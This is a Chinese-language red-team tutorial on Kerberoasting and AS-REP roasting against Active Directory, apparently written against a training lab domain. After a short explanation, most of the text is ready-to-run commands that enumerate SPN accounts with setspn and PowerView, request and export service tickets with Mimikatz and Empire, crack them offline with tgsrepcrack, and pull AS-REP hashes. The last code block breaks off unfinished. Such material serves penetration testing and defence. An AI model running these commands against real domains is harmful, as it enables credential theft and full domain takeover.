# Kerberoast攻击

简单直白的说Kerberoast攻击，就是攻击者为了获取目标服务的访问权限，而设法破解Kerberos服务票据并重写它们的过程。这是红队当中非常常见的一种攻击手法，因为它不需要与服务目标服务进行任何交互，并且可以使用合法的活动目录访问来请求和导出可以离线破解的服务票据，以获取到最终的明文密码。之所以出现这种情况，是因为服务票据使用服务帐户的散列（NTLM）进行加密，所以任何域用户都可以从服务转储散列，而无需将shell引入运行该服务的系统中。

攻击者通常会选择那些可能设置了弱密，码破解成功率较高的票据来尝试破解。一旦攻击者成功破解出了票据，他们有时不仅仅获取的只是服务访问权限，如果服务被配置为在高权限下运行，那么整个域都将可能被攻击者拿下。这些票据可以通过考虑多种因素来识别，例如：

1. SPNs绑定到域用户账户
2. 最后一次密码设置（Password last set）
3. 密码过期时间
4. 最后一次登录（Last logon）

具体来说，Kerberoast攻击涉及以下五个步骤：

1. 服务主体名称（SPN）发现
2. 请求服务票据
3. 导出服务票据
4. 破解服务票据
5. 重写服务票据&RAM注入

- 获取SPN服务

SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN，SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下

获得有价值的SPN，需要满足以下条件：

1. 该SPN注册在域用户帐户(Users)下
2. 域用户账户的权限很高

```powershell
setspn –q */*
setspn -T 域名 -Q */*

# powerview
Get-NetUser -SPN
Get-NetUser -SPN -AdminCount|Select name,whencreated,pwdlastset,lastlogon,serviceprincipalname

# powerview的Get-NetUser -SPN等同于
#  有(serverPrincipalName)这个属性的账号容易受到Kerberoast攻击
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```

- 请求服务票据

```powershell
Add-Type -AssemblyName System.IdentityModel     # 导入模块
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433"
klist       # klist命令将列出所有可用的缓存票据
```

其他方法

```powershell
# 用Mimikatz
kerberos::ask /target:SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL

# 用Invoke-Mimikatz
Invoke-Mimikatz -Command '"kerberos::list"'
```

- 导出服务票据

```powershell
# Mimikatz
kerberos::list /export

# Invoke-Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'


# Empire有一个模块可以自动完成Kerberos服务票据提取任务
usemodule credentials/mimikatz/extract_tickets
```

- 破解服务票据

python脚本tgsrepcrack是Tim Medin Kerberoast工具包的一部分，可以通过提供的密码列表来破解Kerberos票据。

```powershell
python tgsrepcrack.py /root/Desktop/passwords.txt PENTESTLAB_001.kirbi
```

Lee Christensen开发了一个名为extractServiceTicketParts的python脚本，它可以为我们提取服务票据的哈希值，以及一款Go语言编写的哈希破解器tgscrack ，两者可以配合使用。

```powershell
python extractServiceTicketParts.py PENTESTLAB_001.kirbi
```

- 获取Kerberoast主体的用户

```powershell
. .\PowerView_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose # 获取用户名

Get-ASREPHash请求可破解的加密部分
. .\ASREPRoast\ASREPRoast.ps1
Get-ASREPHash -UserName VPN35user -Verbose  # 获取加密部分

在kali中破解

```

